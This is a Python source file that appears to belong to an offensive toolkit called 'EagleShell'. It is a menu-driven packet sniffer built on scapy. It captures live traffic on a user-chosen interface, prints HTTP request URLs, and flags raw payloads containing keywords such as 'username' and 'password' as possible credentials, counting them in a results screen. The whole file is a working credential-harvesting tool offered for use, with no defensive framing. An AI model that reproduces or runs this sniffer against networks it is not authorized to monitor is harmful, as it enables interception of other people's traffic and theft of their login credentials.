#!/usr/bin/python3

# Imports all needed variables and packages
from assets.banners import packetsniffer_banner
from assets.designs import *
from assets.properties import clear_screen
import os
import netifaces
import scapy.all as scapy
from scapy.layers import http

# Main function
def packetsniffer_main():

    # Function that takes user input
    def configuration():
        try:
            global interface_set
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(packetsniffer_banner)
            print(line)
            print('')
            print(author)
            print('Configuration:')
            print('')
            ips()
            print('')
            while True:
                interface_set = input('\u001b[33mINTERFACE \u001b[37m> ').lower()
                if interface_set == 'wlan0' or interface_set == 'wlan1' or interface_set == 'wlan2' or interface_set == 'wlan3' or interface_set == 'mon0' or interface_set == 'mon1' or interface_set == 'mon2' or interface_set == 'mon3' or interface_set == 'wlp5s0' or interface_set == 'wlp5s1' or interface_set == 'wlp5s2' or interface_set == 'wlp5s3' or interface_set == 'eth0' or interface_set == 'eth1' or interface_set == 'eth2' or interface_set == 'eth3':
                    output()
                    result()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()
        except OSError:
            print('\u001b[31m[-] Unable To Locate ' + str(interface_set))
            os.system('sleep 2')
            packetsniffer_main()

    # Function that displays live output
    def output():
        try:
            global total_requests
            global total_credentials
            total_requests = 0
            total_credentials = 0
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(packetsniffer_banner)
            print(line)
            print('')
            print(author)
            print('Output:')
            print('')
            print('\tControls')
            print('\t--------')
            print('\tStop: CTRL+C')
            print('')
            sniff(interface_set)
        except KeyboardInterrupt:
            result()

    # Function that shows all available and unavailable interfaces
    def ips():
        try:
            x = netifaces.interfaces()

            for i in x:
                if i == 'wlan0' or i == 'wlan1' or i == 'wlan2' or i == 'wlan3' or i == 'mon0' or i == 'mon1' or i == 'mon2' or i == 'mon3' or i == 'wlp5s0' or i == 'wlp5s1' or i == 'wlp5s2' or i == 'wlp5s3' or i == 'eth0' or i == 'eth1' or i == 'eth2' or i == 'eth3':
                    print('\n\t[+] Available Interface: ' + i)
                elif i != 'lo' or i != 'tun0' or i != 'tun1' or i != 'tun2' or i != 'tun3':
                    print('\n\t[-] Unavailable Interface: ' + i)
        except KeyboardInterrupt:
            exit_shell()

    # Function that sniffs
    def sniff(interface):
        try:
            scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
        except KeyboardInterrupt:
            result()

    # Function that gets urls
    def get_url(packet):
        try:
            return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        except KeyboardInterrupt:
            result()

    # Function that gets login info
    def get_login_info(packet):
        try:
            if packet.haslayer(scapy.Raw):
                load = str(packet[scapy.Raw].load)
                keywords = ["username", "user", "login", "password", "pass"]
                for keywords in keywords:
                    if keywords in load:
                        return load
        except KeyboardInterrupt:
            result()

    # Function that displays packets
    def process_sniffed_packet(packet):
        try:
            global total_requests
            global total_credentials
            if packet.haslayer(http.HTTPRequest):
                url = get_url(packet)
                print("\t\u001b[33;1m[+] \u001b[32;1mHTTP Request \u001b[37;1m>> \u001b[36;1m" + url.decode())
                total_requests = total_requests + 1
                login_info = get_login_info(packet)
                if login_info:
                    print("\t\u001b[33;1m[+] \u001b[32;1mPossible Credentials \u001b[37;1m>> \u001b[43m\u001b[31m" + login_info + "\u001b[0m\u001b[31;1m")
                    total_credentials = total_credentials + 1
        except KeyboardInterrupt:
            result()

    # Function that displays result
    def result():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(packetsniffer_banner)
            print(line)
            print('')
            print(author)
            print('Result:')
            print('')
            print('\tInput')
            print('\t-----')
            print('\tINTERFACE: ' + interface_set)
            print('')
            print('\tOutput')
            print('\t------')
            print('\tTOTAL REQUESTS: ' + str(total_requests))
            print('\tTOTAL CREDENTIALS: ' + str(total_credentials))
            print('')
            print('\t1): New')
            print('\t2): Exit')
            print('')
            while True:
                result_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
                if result_cmd == '1':
                    packetsniffer_main()
                elif result_cmd == '2':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    # Function that exit
    def exit_shell():
        from assets.functions import exit_main
        exit_main()

    configuration()


packetsniffer_main()
